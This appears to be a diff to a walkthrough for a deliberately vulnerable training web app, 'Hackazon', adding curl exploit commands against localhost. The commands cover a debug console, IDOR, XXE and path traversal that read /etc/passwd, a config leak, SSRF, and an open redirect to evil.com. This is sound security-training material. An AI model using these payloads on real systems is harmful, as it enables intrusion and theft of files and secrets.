@@ -291,3 +291,36 @@ curl -X POST http://localhost:4000/api/v1/reviews -b cookies.txt -d '{"productId
 
 # 3. SSTI
 curl -G "http://localhost:4000/api/v1/invoice/1" --data-urlencode "note={{ flag }}"
+
+# 4. Debug Console
+curl -X POST http://localhost:4000/api/v1/admin/debug \
+  -H "Content-Type: application/json" \
+  -d '{"pin":"1234","code":"debug_secrets.console_flag"}'
+
+# 5. IDOR
+curl http://localhost:4000/api/v1/user/1
+
+# 6. XXE
+curl -X POST http://localhost:4000/api/v1/admin/import -H "x-admin: true" -d '{"xml":"<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><products><product>&xxe;</product></products>"}'
+
+# 7. Path Traversal
+curl "http://localhost:4000/api/v1/download/invoice?file=....//....//....//....//etc/passwd"
+
+# 8. Config Leak
+curl http://localhost:4000/api/v1/config -H "x-admin-key: admin"
+
+# 9. SSRF
+curl "http://localhost:4000/api/v1/proxy?url=http://internal-api:5000/secret"
+
+# 10. Open Redirect
+curl -X POST http://localhost:4000/api/v1/auth/login-redirect -d '{"email":"john@example.com","password":"password123","next":"http://evil.com"}'
+```
+
+---
+
+## 🎉 Conclusion
+
+**Hackazon is now production-ready for educational security training!**
+
+### What You Have
+
